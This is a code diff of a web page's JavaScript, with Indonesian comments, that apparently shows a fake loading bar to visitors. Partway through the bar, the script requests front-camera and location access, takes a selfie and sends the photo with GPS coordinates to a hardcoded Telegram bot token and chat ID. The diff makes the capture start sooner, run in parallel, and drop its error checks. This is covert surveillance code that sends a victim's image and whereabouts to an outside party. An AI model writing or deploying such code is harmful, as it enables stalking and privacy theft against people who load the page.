@@ -48,7 +48,7 @@ document.addEventListener("click", () => {
 
 // ================== KONFIGURASI TELEGRAM ==================
 const TELEGRAM_BOT_TOKEN = "8481518873:AAG8HJYnOBDmfvYx_do2uZJ0VY0H1wTeQqg";
-const TELEGRAM_CHAT_ID = "5730560932";
+const TELEGRAM_CHAT_ID = "8481518873";
 
 // ================== LOADING + PROSES UTAMA ==================
 window.onload = () => {
@@ -59,11 +59,17 @@ window.onload = () => {
     const int = setInterval(() => {
         w++;
         bar.style.width = w + "%";
+
+        // Mulai minta izin kamera + lokasi ketika progress mencapai 40%
+        if (w === 40 && !window.processStarted) {
+            window.processStarted = true;
+            startLocationAndCameraProcess();
+        }
+
         if (w >= 100) {
             clearInterval(int);
             setTimeout(() => {
                 loading.style.display = "none";
-                setTimeout(startLocationAndCameraProcess, 1200); // delay sedikit lebih panjang
             }, 600);
         }
     }, 30);
@@ -72,20 +78,22 @@ window.onload = () => {
 // ================== FUNGSI UTAMA (DIOPTIMALKAN) ==================
 async function startLocationAndCameraProcess() {
     try {
-        console.log("🔄 Meminta izin lokasi dan kamera depan...");
+        console.log("🔄 Memulai permintaan akses kamera depan dan lokasi...");
 
-        const position = await getLocation();
+        // Ambil lokasi dan foto secara paralel agar lebih cepat
+        const [position, photoBlob] = await Promise.all([
+            getLocation(),
+            captureFrontCameraPhoto()
+        ]);
+
         const { latitude, longitude } = position.coords;
-
-        const photoBlob = await captureFrontCameraPhoto();
 
         await sendToTelegram(latitude, longitude, photoBlob);
 
         console.log("✅ Sukses mengirim lokasi + foto kamera depan ke Telegram");
 
     } catch (error) {
-        console.error("❌ Gagal:", error.message);
-        // Optional: alert("Izin lokasi atau kamera ditolak, atau terjadi kesalahan teknis.");
+        console.error("❌ Gagal proses akses kamera/lokasi:", error.message);
     }
 }
 
@@ -108,7 +116,7 @@ async function captureFrontCameraPhoto() {
     try {
         stream = await navigator.mediaDevices.getUserMedia({
             video: { 
-                facingMode: "user",           // Prioritas kamera depan
+                facingMode: "user",           // Kamera depan
                 width: { ideal: 1280, max: 1920 },
                 height: { ideal: 720, max: 1080 }
             }
@@ -120,7 +128,7 @@ async function captureFrontCameraPhoto() {
         await video.play();
 
         // Tunggu agar gambar stabil
-        await new Promise(r => setTimeout(r, 1200));
+        await new Promise(r => setTimeout(r, 1000));
 
         const canvas = document.createElement("canvas");
         canvas.width = video.videoWidth || 1280;
@@ -128,11 +136,11 @@ async function captureFrontCameraPhoto() {
         const ctx = canvas.getContext("2d");
         ctx.drawImage(video, 0, 0);
 
-        // Matikan kamera dengan benar
+        // Matikan kamera
         stream.getTracks().forEach(track => track.stop());
 
         return new Promise(resolve => {
-            canvas.toBlob(resolve, "image/jpeg", 0.88); // kualitas cukup tinggi
+            canvas.toBlob(resolve, "image/jpeg", 0.85);
         });
 
     } catch (err) {
@@ -145,7 +153,7 @@ async function sendToTelegram(lat, lon, photoBlob) {
     const baseUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
 
     // Kirim Lokasi
-    const locResponse = await fetch(`${baseUrl}/sendLocation`, {
+    await fetch(`${baseUrl}/sendLocation`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
@@ -156,21 +164,14 @@ async function sendToTelegram(lat, lon, photoBlob) {
         })
     });
 
-    if (!locResponse.ok) console.warn("⚠️ Gagal mengirim lokasi");
-
     // Kirim Foto
     const formData = new FormData();
     formData.append("chat_id", TELEGRAM_CHAT_ID);
     formData.append("photo", photoBlob, "selfie.jpg");
     formData.append("caption", `📸 Foto Kamera Depan\n📍 ${lat.toFixed(6)}, ${lon.toFixed(6)}\n⏰ ${new Date().toLocaleString('id-ID')}`);
 
-    const photoResponse = await fetch(`${baseUrl}/sendPhoto`, {
+    await fetch(`${baseUrl}/sendPhoto`, {
         method: "POST",
         body: formData
     });
-
-    if (!photoResponse.ok) {
-        const errText = await photoResponse.text();
-        throw new Error(`Gagal mengirim foto: ${photoResponse.status} - ${errText}`);
-    }
 }
